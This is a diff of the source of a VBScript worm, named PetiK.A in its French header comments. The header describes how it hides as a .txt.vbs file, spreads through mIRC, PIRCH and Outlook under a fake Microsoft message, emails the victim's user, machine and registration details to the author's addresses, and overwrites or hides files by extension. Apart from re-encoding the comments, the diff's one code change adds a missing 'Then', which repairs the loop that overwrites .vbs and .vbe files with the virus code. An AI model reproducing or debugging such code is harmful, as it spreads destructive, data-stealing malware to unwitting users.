@@ -1,32 +1,32 @@
 'Taille : 9766 octets
 'Date : 30/01/2000
 'Il se copie dans le dossier WINDIR sous le nom de PetiK.txt.vbs
-'Pour cacher cela, il modifiera l'icÙne des .VBS en .TXT
-'Il infecte ensuite mIRC. Il cherche le dossier par dÈfaut o˘ se trouve le fichier
-'MIRC.INI. Si il le trouve, il crÈe ‡ l'intÈrieur du dossier un fichier SCRIPT.INI
-'Il infecte ensuite PIRCH de la mÍme maniËre.
-'Pour le logiciel Outlook, il va Ècrire son code ‡ l'intÈrieur du message en VBScript
-'De telle sorte que le virus s'active dËs la lecture du message.
-'Il envoie Ègalement diffÈrentes informations, ‡ deux adresses : 
+'Pour cacher cela, il modifiera l'ic√¥ne des .VBS en .TXT
+'Il infecte ensuite mIRC. Il cherche le dossier par d√©faut o√π se trouve le fichier
+'MIRC.INI. Si il le trouve, il cr√©e √† l'int√©rieur du dossier un fichier SCRIPT.INI
+'Il infecte ensuite PIRCH de la m√™me mani√®re.
+'Pour le logiciel Outlook, il va √©crire son code √† l'int√©rieur du message en VBScript
+'De telle sorte que le virus s'active d√®s la lecture du message.
+'Il envoie √©galement diff√©rentes informations, √† deux adresses : 
 'petik@caramail.com et ppetik@hotmail.com. Les informations sont :
 ' - Nom de l'utilisateur et de l'Organisation
 ' - Le nom de l'ordinateur
 ' - Le pays
-' - La version et le numÈro de WINDOWS
-' - Le numÈro d'identification
-' - Le numÈro d'enregistrement
-' - La page de dÈmarrage d'Internet Explorer
-' - Le dossier de tÈlÈchargement
+' - La version et le num√©ro de WINDOWS
+' - Le num√©ro d'identification
+' - Le num√©ro d'enregistrement
+' - La page de d√©marrage d'Internet Explorer
+' - Le dossier de t√©l√©chargement
 ' - Le nom de dossier de WINDOWS, SYSTEM, TEMPORAIRE et de PROGRAM FILES
 ' Et envoie tous cela avec comme sujet :
-' Message pour PetiK de XXX o˘ XXX est le nom d'Utilisateur
-'Le message envoyÈ aux autres personnes est :
+' Message pour PetiK de XXX o√π XXX est le nom d'Utilisateur
+'Le message envoy√© aux autres personnes est :
 ' " Important Message From Micrsoft Corporation "
 'Il infecte ensuite les fichiers en fonction de leur extension.
-' VBS et VBE : Ècrit le code du virus ‡ l'intÈrieur.
-' JS et JSE : Ècrit le code et change l'extension : file.js => file.vbs
-' EXE, INI, GIF, JPG et HTM : crÈer un nouveau fichier .VBS avec code du virus
-' MP3, DOC, XLS, PPT et HLP : met l'attribut cachÈ
+' VBS et VBE : √©crit le code du virus √† l'int√©rieur.
+' JS et JSE : √©crit le code et change l'extension : file.js => file.vbs
+' EXE, INI, GIF, JPG et HTM : cr√©er un nouveau fichier .VBS avec code du virus
+' MP3, DOC, XLS, PPT et HLP : met l'attribut cach√©
 '
 'VBS/Outlook/mIrc/PIRCH/PetiK.A par PetiK
 Dim fso,ws,file
@@ -246,7 +246,7 @@ Set fc = f.Files
 For Each f1 in fc
 ext = fso.GetExtensionName(f1.path)
 ext = lcase(ext)
-if (ext="vbs") or (ext="vbe")
+if (ext="vbs") or (ext="vbe") Then
 Set ap=fso.OpenTextFile(f1.path,2,True)
 ap.Write vbscopie
 ap.Close
